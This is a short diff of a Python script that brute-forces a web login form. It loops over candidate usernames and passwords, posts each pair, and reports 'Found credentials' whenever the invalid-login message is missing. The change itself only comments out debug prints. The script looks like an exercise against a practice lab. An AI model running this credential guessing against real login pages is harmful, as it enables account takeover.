@@ -51,11 +51,11 @@ for username in usernames:
     print(f"Trying username: {username}, {passwords[1]}")
     response = session.post(login_url, data=login_data)
     if "Invalid username or password." not in response.text:
-        print(response.text)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        warning = soup.find('p', class_='is-warning')
-        print(warning)
-        print(warning.text)
+        #print(response.text)
+        #soup = BeautifulSoup(response.text, 'html.parser')
+        #warning = soup.find('p', class_='is-warning')
+        #print(warning)
+        #print(warning.text)
         print(f"Found credentials: username: {username}")
         print("")
         for password in passwords:
